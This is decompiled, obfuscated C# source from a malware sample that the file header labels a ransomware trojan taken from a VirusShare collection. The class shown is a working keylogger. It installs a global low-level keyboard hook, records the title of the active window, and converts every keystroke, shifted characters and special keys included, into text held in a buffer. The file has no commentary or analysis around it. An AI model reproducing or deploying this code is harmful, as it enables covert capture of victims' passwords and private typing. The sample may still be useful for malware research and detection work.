// Decompiled with JetBrains decompiler
// Type: .
// Assembly: coproccessor, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 489BB54C-AC64-4776-B7C7-9CD76A5742AF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-c8a5aa891fc37cf6a3724b7ba25ce00e61d4f00bdc5d5c35ff70f3359185f7f5.exe

using \u0006;
using \u000E;
using \u000E\u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u000F\u001E
  {
    private string \u0001;
    private static IntPtr \u0002 = (IntPtr) 0;
    private static string \u0003 = \u0008.\u0007(177);
    private static \u000F\u001E.\u009C\u0003 \u0004 = (\u000F\u001E.\u009C\u0003) null;

    public static string \u0008\u001E([In] IntPtr obj0)
    {
      string str;
      try
      {
        if (obj0.ToInt32() <= 0)
        {
          str = (string) null;
        }
        else
        {
          int num = \u000F\u001E.\u0099\u0003(obj0);
          if (num == 0)
          {
            str = (string) null;
          }
          else
          {
            StringBuilder stringBuilder = new StringBuilder(checked (num + 1));
            \u000F\u001E.\u0098\u0003((int) obj0, stringBuilder, stringBuilder.Capacity);
            str = stringBuilder.ToString().Trim();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static void \u000E\u001E()
    {
      try
      {
        \u000F\u001E.\u0004 = new \u000F\u001E.\u009C\u0003(\u000F\u001E.\u0007\u000F);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u000F\u001E.\u0002 = (IntPtr) \u000F\u001E.\u0095\u0003(13, \u000F\u001E.\u0004, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0095\u0003(
      [In] int obj0,
      [In] \u000F\u001E.\u009C\u0003 obj1,
      [In] int obj2,
      [In] int obj3);

    public static int \u0007\u000F([In] int obj0, [In] int obj1, [In] ref \u000F\u001E.\u0010\u001E obj2)
    {
      try
      {
        string Left = \u000F\u001E.\u0008\u001E(\u000F\u001E.\u0097\u0003());
        if (Operators.CompareString(Left, \u000F\u001E.\u0003, false) != 0)
        {
          \u000F\u001E.\u0003 = Left;
          \u0004\u001E.\u0012 = \u0004\u001E.\u0012 + Environment.NewLine + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2728), \u0008.\u0007(227)) + \u0008.\u0007(2634) + Left + \u0008.\u0007(2634) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2793), \u0008.\u0007(227)) + Environment.NewLine + Environment.NewLine;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread.Sleep(10);
        string str = \u0008.\u0007(177);
        if (obj1 == 256 | obj1 == 260)
        {
          switch (obj2.\u0001)
          {
            case 8:
              \u0004\u001E.\u0012 = \u0004\u001E.\u0012.Substring(0, checked (\u0004\u001E.\u0012.Length - 1));
              break;
            case 9:
              str = char.ConvertFromUtf32(9);
              break;
            case 13:
              str = Environment.NewLine;
              break;
            case 16:
            case 160:
            case 161:
              str = \u0008.\u0007(177);
              break;
            case 18:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3422), \u0008.\u0007(227));
              break;
            case 20:
              str = !Control.IsKeyLocked(Keys.Capital) ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3100), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3067), \u0008.\u0007(227));
              break;
            case 27:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3050), \u0008.\u0007(227));
              break;
            case 32:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2982), \u0008.\u0007(227));
              break;
            case 33:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3457), \u0008.\u0007(227));
              break;
            case 34:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3482), \u0008.\u0007(227));
              break;
            case 35:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3591), \u0008.\u0007(227));
              break;
            case 36:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3574), \u0008.\u0007(227));
              break;
            case 37:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2956), \u0008.\u0007(227));
              break;
            case 38:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2969), \u0008.\u0007(227));
              break;
            case 39:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2930), \u0008.\u0007(227));
              break;
            case 40:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2943), \u0008.\u0007(227));
              break;
            case 46:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3033), \u0008.\u0007(227));
              break;
            case 48:
            case 49:
            case 50:
            case 51:
            case 52:
            case 53:
            case 54:
            case 55:
            case 56:
            case 57:
              if (\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown)
              {
                string[] strArray = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2858), \u0008.\u0007(227)).Split(Conversions.ToChar(\u0007\u001E.\u0005\u001E(\u0008.\u0007(2899), \u0008.\u0007(227))));
                switch (obj2.\u0001)
                {
                  case 48:
                    str = strArray[9];
                    break;
                  case 49:
                    str = strArray[0];
                    break;
                  case 50:
                    str = strArray[1];
                    break;
                  case 51:
                    str = strArray[2];
                    break;
                  case 52:
                    str = strArray[3];
                    break;
                  case 53:
                    str = strArray[4];
                    break;
                  case 54:
                    str = strArray[5];
                    break;
                  case 55:
                    str = strArray[6];
                    break;
                  case 56:
                    str = strArray[7];
                    break;
                  case 57:
                    str = strArray[8];
                    break;
                }
              }
              else
              {
                str = char.ConvertFromUtf32(obj2.\u0001);
                break;
              }
              break;
            case 65:
            case 66:
            case 67:
            case 68:
            case 69:
            case 70:
            case 71:
            case 72:
            case 73:
            case 74:
            case 75:
            case 76:
            case 77:
            case 78:
            case 79:
            case 80:
            case 81:
            case 82:
            case 83:
            case 84:
            case 85:
            case 86:
            case 87:
            case 88:
            case 89:
            case 90:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToLower() : char.ConvertFromUtf32(checked (obj2.\u0001 + 32)).ToUpper();
              break;
            case 91:
            case 92:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3393), \u0008.\u0007(227));
              break;
            case 96:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3205), \u0008.\u0007(227));
              break;
            case 97:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3214), \u0008.\u0007(227));
              break;
            case 98:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3223), \u0008.\u0007(227));
              break;
            case 99:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3232), \u0008.\u0007(227));
              break;
            case 100:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3241), \u0008.\u0007(227));
              break;
            case 101:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3250), \u0008.\u0007(227));
              break;
            case 102:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3259), \u0008.\u0007(227));
              break;
            case 103:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3268), \u0008.\u0007(227));
              break;
            case 104:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3277), \u0008.\u0007(227));
              break;
            case 105:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3286), \u0008.\u0007(227));
              break;
            case 112:
            case 113:
            case 114:
            case 115:
            case 116:
            case 117:
            case 118:
            case 119:
            case 120:
            case 121:
            case 122:
            case 123:
            case 124:
            case 125:
            case 126:
            case (int) sbyte.MaxValue:
            case 128:
            case 129:
            case 130:
            case 131:
            case 132:
            case 133:
            case 134:
            case 135:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2908), \u0008.\u0007(227)) + Conversions.ToString(checked (obj2.\u0001 - 111)) + \u0007\u001E.\u0005\u001E(\u0008.\u0007(2921), \u0008.\u0007(227));
              break;
            case 144:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.NumLock ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3346), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3313), \u0008.\u0007(227));
              break;
            case 162:
            case 163:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(2991), \u0008.\u0007(227));
              break;
            case 164:
            case 165:
              str = \u0007\u001E.\u0005\u001E(\u0008.\u0007(3016), \u0008.\u0007(227));
              break;
            case 186:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3538), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3529), \u0008.\u0007(227));
              break;
            case 187:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3304), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3295), \u0008.\u0007(227));
              break;
            case 188:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3178), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3169), \u0008.\u0007(227));
              break;
            case 189:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3160), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3151), \u0008.\u0007(227));
              break;
            case 190:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3196), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3187), \u0008.\u0007(227));
              break;
            case 191:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(2562), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3565), \u0008.\u0007(227));
              break;
            case 192:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3142), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3133), \u0008.\u0007(227));
              break;
            case 219:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3384), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3375), \u0008.\u0007(227));
              break;
            case 220:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3520), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3511), \u0008.\u0007(227));
              break;
            case 221:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3448), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3439), \u0008.\u0007(227));
              break;
            case 222:
              str = !\u0016\u0002.\u0013\u0002().Keyboard.ShiftKeyDown ? \u0007\u001E.\u0005\u001E(\u0008.\u0007(3556), \u0008.\u0007(227)) : \u0007\u001E.\u0005\u001E(\u0008.\u0007(3547), \u0008.\u0007(227));
              break;
            default:
              str = \u0008.\u0007(177);
              break;
          }
          \u0004\u001E.\u0012 += str;
          \u0004\u001E.\u0087 = \u0004\u001E.\u0012;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num;
      return num;
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
    public static extern IntPtr \u0097\u0003();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int \u0099\u0003([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0098\u0003([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    public \u000F\u001E([In] string obj0)
    {
      try
      {
        this.\u0001 = obj0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private delegate int \u009C\u0003([In] int obj0, [In] int obj1, [In] ref \u000F\u001E.\u0010\u001E obj2);

    public struct \u0010\u001E
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
    }
  }
}
